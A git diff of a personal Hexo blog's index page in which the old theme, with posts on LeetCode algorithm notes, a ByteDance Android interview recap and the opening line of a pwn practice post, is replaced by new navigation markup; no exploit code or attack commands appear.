@@ -1,1331 +1,889 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="utf-8">
-  
-  <title>ssj的博客</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    
+
+    <title></title>
+    <meta name="author" content="ssj">
+    
+    
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ssj的博客">
-<meta property="og:url" content="https://github.com/Cracke-S-J/index.html">
-<meta property="og:site_name" content="ssj的博客">
-<meta property="og:locale" content="default">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ssj的博客">
-  
-    <link rel="alternative" href="/atom.xml" title="ssj的博客" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/img/favicon.png">
-  
-  
-      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
-  
-  <link rel="stylesheet" href="/css/style.css">
-  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-  
+
     
+    <meta property="og:site_name" content="ssj&#39;s blog">
+
     
-  
-  
-      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  
-  <!-- 加载特效 -->
-    <script src="/js/pace.js"></script>
-    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
-  <script>
-      var yiliaConfig = {
-          rootUrl: '/',
-          fancybox: true,
-          animate: true,
-          isHome: true,
-          isPost: false,
-          isArchive: false,
-          isTag: false,
-          isCategory: false,
-          open_in_new: false
-      }
-  </script>
-</head></html>
+    <meta property="og:image" content>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="ssj&#39;s blog" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+</html>
+
 <body>
-  <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <a href="/" class="profilepic">
-            
-            <img lazy-src="/img/head.png" class="js-avatar">
-            
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
         </a>
-
-        <hgroup>
-          <h1 class="header-author"><a href="/" title="Hi Mate">ssj</a></h1>
-        </hgroup>
-
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">ssj&#39;s blog</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
         
-        
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                    
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
                 </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">ssj</p>
+                        <p class="desc"></p>
+                    </div>
                 </div>
             </div>
+        </li>
         
 
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a href="/">博客首页</a></li>
-                        
-                            <li><a href="/categories/programming/">编程相关</a></li>
-                        
-                            <li><a href="/categories/opera/">跟ssj一起听戏</a></li>
-                        
-                            <li><a href="/2019/05/29/resume/">本人简历</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fl mail" target="_blank" href="/1263914174@qq.com" title="mail">mail</a>
-                            
-                                <a class="fl github" target="_blank" href="https://github.com/Cracke-S-J" title="github">github</a>
-                            
-                                <a class="fl QQ" target="_blank" href="/1263914174" title="QQ">QQ</a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/C/" style="font-size: 10px;">C++</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/Ethereum/" style="font-size: 15px;">Ethereum</a> <a href="/tags/android/" style="font-size: 15px;">android</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/resume/" style="font-size: 10px;">resume</a> <a href="/tags/京剧/" style="font-size: 17.5px;">京剧</a> <a href="/tags/其它/" style="font-size: 10px;">其它</a> <a href="/tags/定场诗/" style="font-size: 10px;">定场诗</a> <a href="/tags/算法/" style="font-size: 10px;">算法</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/面试体验/" style="font-size: 10px;">面试体验</a> <a href="/tags/马甲包/" style="font-size: 12.5px;">马甲包</a>
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
                     
-                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://luuman.github.io/">name</a>
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
                     
-                    </div>
-                </section>
-                
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
 
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">大学生，XCalibyte 实习中，业余票友，专业android逆向，资深猫奴。</div>
-                </section>
-                
-            </div>
-        </div>
-    </header>                
-</div>
-    </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">ssj</a></h1>
-      </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                
-                    <img lazy-src="/img/head.png" class="js-avatar">
-                
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="Me">ssj</a></h1>
-            </hgroup>
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
             
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a href="/">博客首页</a></li>
-                
-                    <li><a href="/categories/programming/">编程相关</a></li>
-                
-                    <li><a href="/categories/opera/">跟ssj一起听戏</a></li>
-                
-                    <li><a href="/2019/05/29/resume/">本人简历</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                <div class="social">
-                    
-                        <a class="mail" target="_blank" href="/1263914174@qq.com" title="mail">mail</a>
-                    
-                        <a class="github" target="_blank" href="https://github.com/Cracke-S-J" title="github">github</a>
-                    
-                        <a class="QQ" target="_blank" href="/1263914174" title="QQ">QQ</a>
-                    
-                </div>
-            </nav>
-        </header>                
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/programming/">
+                    programming <span class="right">16</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/opera/">
+                    opera <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/其它/">
+                    其它 <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/resume/">
+                    resume <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-algorithm" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/02/14/algorithm/" class="article-date">
-      <time datetime="2020-02-13T17:07:29.000Z" itemprop="datePublished">2020-02-14</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/14/algorithm/">每天几道 算法</a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>跟 dyf 聊天，扯起了算法，从高三 oi 退役以来，就大一冬天看过一阵算法，去梆梆之后就基本再也没看过了，于是就上 leetcode 刷了几道，难度相比竞赛来说还是弱的很，但是挺有意思的。</p>
-<h2 id="爬楼梯问题"><a href="#爬楼梯问题" class="headerlink" title="爬楼梯问题"></a>爬楼梯问题</h2><p>就是一个线性 dp，dp[i] = min(dp[i-1]+val[i-1], dp[i-2]+val[i-2])，当前状态是由走一步或者走两步来的。</p>
-<h2 id="找第一个不重复的字母"><a href="#找第一个不重复的字母" class="headerlink" title="找第一个不重复的字母"></a>找第一个不重复的字母</h2><p>水题，不表。</p>
-<h2 id="出现前-k-多的字符串"><a href="#出现前-k-多的字符串" class="headerlink" title="出现前 k 多的字符串"></a>出现前 k 多的字符串</h2><p>STL 排排序就行。</p>
-<h2 id="数组组三角形"><a href="#数组组三角形" class="headerlink" title="数组组三角形"></a>数组组三角形</h2><p>左右指针移动计数，O(n^2)。</p>
-<h2 id="毒死猪"><a href="#毒死猪" class="headerlink" title="毒死猪"></a>毒死猪</h2><p>这个挺有意思，可以算机智题或建模。假设有 n 只水桶，猪饮水中毒后会在 m 分钟内死亡，你需要多少猪（x）就能在 p 分钟内找出 “有毒” 水桶？这 n 只水桶里有且仅有一只有毒的桶。x = (p/m+1)根号(n)。</p>
-<h2 id="铺地板"><a href="#铺地板" class="headerlink" title="铺地板"></a>铺地板</h2><p>你是一位施工队的工长，根据设计师的要求准备为一套设计风格独特的房子进行室内装修。房子的客厅大小为 n x m，为保持极简的风格，需要使用尽可能少的 正方形 瓷砖来铺盖地面。假设正方形瓷砖的规格不限，边长都是整数。(1 &lt;= n &lt;= 13, 1 &lt;= m &lt;= 13)</p>
-<p>看起来像可恶的 dp，一共有三种情况，两个块横着拼或竖着拼，还有一种是四个块围起来，中间一个 1x1 的小块，O((m*n)^2) = 2,924,207，合适。</p>
-<h2 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h2><p>给定一个所有节点为非负值的二叉搜索树,求树中任意两节点的差的绝对值的最小值。</p>
-<p>知识点是二叉搜索树，它的中序遍历是从小到大排序的。</p>
-<h2 id="回文字典序"><a href="#回文字典序" class="headerlink" title="回文字典序"></a>回文字典序</h2><p>一道无聊的模拟题。</p>
-<h2 id="奇偶跳"><a href="#奇偶跳" class="headerlink" title="奇偶跳"></a>奇偶跳</h2><p>给定一个整数数组 A，你可以从某一起始索引出发，跳跃一定次数。在你跳跃的过程中，第 1、3、5… 次跳跃称为奇数跳跃，而第 2、4、6… 次跳跃称为偶数跳跃。</p>
-<p>你可以按以下方式从索引 i 向后跳转到索引 j（其中 i &lt; j）：</p>
-<p>在进行奇数跳跃时（如，第 1，3，5… 次跳跃），你将会跳到索引 j，使得 A[i] &lt;= A[j]，A[j] 是可能的最小值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>在进行偶数跳跃时（如，第 2，4，6… 次跳跃），你将会跳到索引 j，使得 A[i] =&gt; A[j]，A[j] 是可能的最大值。如果存在多个这样的索引 j，你只能跳到满足要求的最小索引 j 上。<br>（对于某些索引 i，可能无法进行合乎要求的跳跃。）<br>如果从某一索引开始跳跃一定次数（可能是 0 次或多次），就可以到达数组的末尾（索引 A.length - 1），那么该索引就会被认为是好的起始索引。</p>
-<p>返回好的起始索引的数量。</p>
-<p>这显然是一道 dp 题。</p>
-<p>f(i, 0) = f(j, 1)<br>f(i, 1) = f(k, 0)<br>j 表示奇数跳的下一个位置，k 表示偶数跳的下一个位置。</p>
-<p>下一个位置的预处理可以用单调队列。</p>
-<h2 id="合并两个数组"><a href="#合并两个数组" class="headerlink" title="合并两个数组"></a>合并两个数组</h2><p>无聊的排序。</p>
-<h2 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h2><p>无聊的字符串处理题。</p>
-<h2 id="我的日程安排表"><a href="#我的日程安排表" class="headerlink" title="我的日程安排表"></a>我的日程安排表</h2><p>看起来这么像线段树呢，其实不用，遍历就行。前缀和差分也行。</p>
-<h2 id="不喜欢问题"><a href="#不喜欢问题" class="headerlink" title="不喜欢问题"></a>不喜欢问题</h2><p>有点像囚犯打架问题，着色。</p>
-<h2 id="奇怪的打印机"><a href="#奇怪的打印机" class="headerlink" title="奇怪的打印机"></a>奇怪的打印机</h2><p>有台奇怪的打印机有以下两个特殊要求：</p>
-<ol>
-<li>打印机每次只能打印同一个字符序列。</li>
-<li>每次可以在任意起始和结束位置打印新字符，并且会覆盖掉原来已有的字符。</li>
-</ol>
-<p>事出有幺，必为 dp，有一种合并石子的感 jio。可是合并石子我已经忘了。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> 枚举长度</span><br><span class="line">    <span class="keyword">for</span> 枚举边界</span><br><span class="line">        <span class="keyword">for</span> 枚举边界中的 k</span><br><span class="line">            f[l][r] = min(f[l][r], f[l][k - <span class="number">1</span>] + f[k + <span class="number">1</span>][r]);</span><br></pre></td></tr></table></figure>
-<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>代码能力题，两个栈。现在再写，有一种 tm 语法树的感觉。</p>
-<h2 id="迟到"><a href="#迟到" class="headerlink" title="迟到"></a>迟到</h2><p>水模拟。</p>
-<h2 id="种花"><a href="#种花" class="headerlink" title="种花"></a>种花</h2><p>水模拟。</p>
-<h2 id="还是不喜欢问题"><a href="#还是不喜欢问题" class="headerlink" title="还是不喜欢问题"></a>还是不喜欢问题</h2><p>。</p>
-<h2 id="子串独特字符"><a href="#子串独特字符" class="headerlink" title="子串独特字符"></a>子串独特字符</h2><p>如果一个字符在字符串 S 中有且仅有出现一次，那么我们称其为独特字符。</p>
-<p>例如，在字符串 S = “LETTER” 中，”L” 和 “R” 可以被称为独特字符。</p>
-<p>我们再定义 UNIQ(S) 作为字符串 S 中独特字符的个数。</p>
-<p>那么，在 S = “LETTER” 中， UNIQ(“LETTER”) =  2。</p>
-<p>对于给定字符串 S，计算其所有非空子串的独特字符的个数（即 UNIQ(substring)）之和。</p>
-<p>如果在 S 的不同位置上出现两个甚至多个相同的子串，那么我们认为这些子串是不同的。</p>
-<p>考虑到答案可能会非常大，规定返回格式为：结果 mod 10 ^ 9 + 7。</p>
-<p>说明: 0 &lt;= S.length &lt;= 10000。</p>
-<p><code>f[i] = f[i − 1] + (i + n[i] − 2 ∗ m[i])</code> 瞎鸡推一下推来的。</p>
-<p><code>f[i] = sum(1 to i - 1 -&gt; i)</code></p>
-<h2 id="滑砖拼图"><a href="#滑砖拼图" class="headerlink" title="滑砖拼图"></a>滑砖拼图</h2><p>是什么华容道游戏，bfs。</p>
-<h2 id="还是猪"><a href="#还是猪" class="headerlink" title="还是猪"></a>还是猪</h2><p>。</p>
-<h2 id="优美排列"><a href="#优美排列" class="headerlink" title="优美排列"></a>优美排列</h2><p>假设有从 1 到 N 的 N 个整数，如果从这 N 个数字中成功构造出一个数组，使得数组的第 i 位 (1 &lt;= i &lt;= N) 满足如下两个条件中的一个，我们就称这个数组为一个优美的排列。条件：</p>
-<ul>
-<li>第 i 位的数字能被 i 整除</li>
-<li>i 能被第 i 位上的数字整除</li>
-</ul>
-<p>现在给定一个整数 N，请问可以构造多少个优美的排列？（N &lt;= 15）</p>
-<p>暴力的气息哈哈哈哈。dfs。</p>
-<h2 id="连网线"><a href="#连网线" class="headerlink" title="连网线"></a>连网线</h2><p>并查集，只要大于 n - 1 条边，就是块数 - 1，否则不行。</p>
-<h2 id="数据流不相交区间"><a href="#数据流不相交区间" class="headerlink" title="数据流不相交区间"></a>数据流不相交区间</h2><p>给定一个非负整数的数据流输入 a1，a2，…，an，…，将到目前为止看到的数字总结为不相交的区间列表。</p>
-<p>例如，假设数据流中的整数为 1，3，7，2，6，…，每次的总结为：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">7</span>, <span class="number">7</span>]</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>], [<span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure>
-<p>讲真一开始没看懂。后来，就插入就完了。</p>
-<p>最后 3 秒提交通过，稳…</p>
-<h2 id="填数独"><a href="#填数独" class="headerlink" title="填数独"></a>填数独</h2><p>dfs 回溯。会爆栈，可以用空间优化时间。</p>
-<h2 id="二叉树的祖父结点"><a href="#二叉树的祖父结点" class="headerlink" title="二叉树的祖父结点"></a>二叉树的祖父结点</h2><p><code>dfs(gp_val, p_val, node);</code></p>
-<h2 id="返回重复子树"><a href="#返回重复子树" class="headerlink" title="返回重复子树"></a>返回重复子树</h2><p>又让我想起了 compiler…用 map 映射，然后花式遍历。</p>
-<h2 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h2><p>就是想让写一下链表反转。</p>
-<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>两行代码…</p>
-<h2 id="词根"><a href="#词根" class="headerlink" title="词根"></a>词根</h2><p>在英语中，我们有一个叫做 词根(root)的概念，它可以跟着其他一些词组成另一个较长的单词——我们称这个词为 继承词(successor)。例如，词根an，跟随着单词 other(其他)，可以形成新的单词 another(另一个)。</p>
-<p>现在，给定一个由许多词根组成的词典和一个句子。你需要将句子中的所有继承词用词根替换掉。如果继承词有许多可以形成它的词根，则用最短的词根替换它。</p>
-<p>这个是给单词建图…快的话建个数组模拟邻接表。</p>
-<h2 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h2><p>这小范围，写个 bfs 就行。</p>
-<h2 id="找数"><a href="#找数" class="headerlink" title="找数"></a>找数</h2><p>给定一个大小为 n 的数组，找出其中所有出现超过 ⌊ n/3 ⌋ 次的元素。</p>
-<p>说明: 要求算法的时间复杂度为 O(n)，空间复杂度为 O(1)。</p>
-<p>这个算法叫摩尔投票算法？？</p>
-<h2 id="建二叉搜索树"><a href="#建二叉搜索树" class="headerlink" title="建二叉搜索树"></a>建二叉搜索树</h2><h2 id="边框着色"><a href="#边框着色" class="headerlink" title="边框着色"></a>边框着色</h2><p>dfs。</p>
-<h2 id="判断是否是子串"><a href="#判断是否是子串" class="headerlink" title="判断是否是子串"></a>判断是否是子串</h2><p>双指针。</p>
-<h2 id="切砖"><a href="#切砖" class="headerlink" title="切砖"></a>切砖</h2><p>智力题。</p>
-<h2 id="猜数"><a href="#猜数" class="headerlink" title="猜数"></a>猜数</h2><p>智力题。</p>
-<h2 id="位运算加法"><a href="#位运算加法" class="headerlink" title="位运算加法"></a>位运算加法</h2><p>c++ 编译选项加的有毒？我就是成心让它溢出的，佛，最后用 js 写过了。</p>
-<h2 id="增减字符串"><a href="#增减字符串" class="headerlink" title="增减字符串"></a>增减字符串</h2><p>a~，又让我想起单调队列了…不过好像是个 O(n) 的模拟题。</p>
-<h2 id="字母板上的路径"><a href="#字母板上的路径" class="headerlink" title="字母板上的路径"></a>字母板上的路径</h2><p>让我想起了曼哈顿距离…其实没啥关系，是道水题。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/算法/">算法</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-bytedanceinterview" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/02/05/bytedanceinterview/" class="article-date">
-      <time datetime="2020-02-05T08:06:01.000Z" itemprop="datePublished">2020-02-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/02/05/bytedanceinterview/">字跳面试实况转播</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>岗位是 Android Native 层开发，团队部门啥的我都不知道，具体干啥我也不知道。</p>
-<p>视频面一次，现场一次。在此我要吐槽视频面，第一是晚上，反正是各种不行，一开始是我进不去，面试官让我多进几次，他也是进了好几次，我各种重启、重新进，终于进去了，然后各种听不见声音，各种看不见对方，通过双方不断地玄学重进之后，终于我能听到面试官的声音，能看到双方画面，他能听见我的声音，看不到我的画面，到此已经45分钟过去了，然后面试官放弃了，说改天，以至于折腾了45分钟，面试官终于还是没有成功地看到我的脸。。。</p>
-<p>还有一个前提是我没准备，真的没准备，5 分钟翻了翻 java 的 hello world 怎么写，因为在 xc5 还没太干够，而且大二下的课确实也多点，字跳的管理应该也会比较严，不方便随时失踪。</p>
-<p>细节记不清了（嘤嘤），大致是下面这样（两面杂揉到一起）。</p>
-<p>面试官：先介绍一下自己。</p>
-<p>我：叽里呱啦…(谦虚地吹13)。</p>
-<p>面试官：你玩游戏吗？</p>
-<p>我：不玩。</p>
-<p>面试官：为什么不玩，详细说说。</p>
-<p>我：（？）小时候爱玩，长大不爱玩了。</p>
-<p>面试官：为什么。</p>
-<p>我：（？）写代码以后就不爱打游戏了。</p>
-<p>（沉默…）</p>
-<p>面试官：继续。</p>
-<p>我：（？wdnmd 还要我说啥）现在只玩养生游戏。</p>
-<p>面试官：我们先来问一些基础问题。</p>
-<p>我：（wdnmd）终于开始了。</p>
-<p>面试官：说一下 c 语言函数调用过程，说一下虚函数在类中的内存分布。</p>
-<p>我：blablah…</p>
-<p>面试官：说一下 Android 打包过程。</p>
-<p>我：忘了。</p>
-<p>面试官：说一下 Apk 包里有哪些东西。</p>
-<p>我：classes.dex lib ….</p>
-<p>面试官：说一下 打包过程。</p>
-<p>我：忘了顺序了。</p>
-<p>面试官：说一下 Android 四大组件，Layout 什么的。</p>
-<p>我：<del>爷</del>忘了（哈哈哈哈）。</p>
-<p>面试官：说一下 java 四种引用的区别，重载和重写的区别。</p>
-<p>我：重载是….重写是….，四种引用忘了。</p>
-<p>面试官：Java GC 说一下。</p>
-<p>我：什么代代代代，这样那样……</p>
-<p>（相信我当初面梆梆的时候这些东西可会了，好久没看是真的忘）。</p>
-<p>然后开始聊过往经历。</p>
-<p>我：（劳资开始了）Android 有三种加固，分别是，C++ Java 混淆能怎么怎么做，我是怎么日微信和支付宝的，我是怎么上马甲包的……</p>
-<p>面试官：还有什么没<del>吹</del>讲到的吗？</p>
-<p>我：应该没有了。</p>
-<p>下面是重头戏，算法：（字跳一直是很重算法的（摊手.gif））</p>
-<p>手写算法：</p>
-<ul>
-<li>冒泡排序（是我有罪，竟然没写好）</li>
-<li>LCA（这个<del>爷</del>我会，写写写…）</li>
-</ul>
-<p>面试官：不准用额外空间，不准改变树的结构。</p>
-<p>我：（<del>爷</del>不会了）瞎丁丁写。</p>
-<p>（因为我的算法都是高中时打 noip 学的，重速度不重空间，所以我会的 LCA 带个额外的预处理的结点深度，然后树上倍增，查询时间复杂度是 O(logn)，可是面试官不让这么弄，所以我开始瞎造，其实应该忽略时间复杂度，先写一个再说，面试官心里预期可能就写个 O(nlogn)的就行）</p>
-<p>视频在线算法：</p>
-<ul>
-<li>二叉树已知先序和中序，求后序。</li>
-</ul>
-<p>面试官：代码能力怎么样。</p>
-<p>我：还行吧，高中时候会写算法，现在好久不看了。</p>
-<p>（疯狂回想先序中序后序是什么来着，印象中写了挺久的，但是也算写出来了吧哈哈哈哈）。</p>
-<p>现场还问了一个脑筋急转弯，一根木棍燃烧一小时，给一把木棍，怎么取 45 分钟。</p>
-<p>这个把戏我之前听说过，然后我故作沉思后<del>章</del>张口就来。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-    <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/programming/">编程</a>
-    </div>
-
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Android/">Android</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/面试体验/">面试体验</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-daily-pwn" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/01/21/daily-pwn/" class="article-date">
-      <time datetime="2020-01-21T09:22:42.000Z" itemprop="datePublished">2020-01-21</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/01/21/daily-pwn/">每天一道 PWN</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>ssj 最近闲的*疼，决定每天写一道 pwn 题（也可能是几道）。</p>
-<h2 id="2020-1-21"><a href="#2020-1-21" class="headerlink" title="2020-1-21"></a>2020-1-21</h2><h3 id="UAF-lab-10-hacknote"><a href="#UAF-lab-10-hacknote" class="headerlink" title="UAF - lab 10 hacknote"></a>UAF - lab 10 hacknote</h3><p>主要有四个功能。</p>
